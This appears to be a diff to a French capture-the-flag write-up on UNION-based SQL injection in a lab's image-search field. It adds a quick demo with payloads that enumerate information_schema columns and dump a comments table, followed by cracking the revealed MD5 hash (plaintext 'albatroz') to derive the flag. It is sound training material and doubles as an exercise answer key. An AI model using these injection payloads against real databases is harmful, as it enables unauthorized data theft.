@@ -2,6 +2,15 @@
 
 L'**Injection SQL basée sur UNION** est un type spécifique d'injection SQL où l'opérateur UNION est utilisé pour combiner les résultats de deux instructions SELECT ou plus en un seul résultat. Cela permet à l'attaquant de récupérer des données d'autres tables qui n'étaient pas destinées à être affichées.
 
+⚡ Démo rapide
+
+Dans le champ "Search Image", coller dans l'ordre :
+```sql
+-1 UNION SELECT table_name, column_name FROM information_schema.columns
+-1 UNION SELECT url, comment FROM list_images
+```
+Puis déchiffrer le MD5 trouvé dans le commentaire (crackstation.net) et le hacher en SHA256.
+
 📖 Approche
 
 Dans la section "Search Image", j'ai testé l'injection avec `1 OR 1=1`, ce qui a retourné toutes les images. J'ai utilisé `UNION SELECT` pour énumérer les tables.
@@ -19,7 +28,7 @@ MD5 déchiffré -> `albatroz`. SHA256(`albatroz`) -> Flag.
 
 ```
 [
-	ID: -1 UNION SELECT url, comment FROM list_images 
+	ID: -1 UNION SELECT url, comment FROM list_images
 	Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
 	Url : borntosec.ddns.net/images.png
 ]
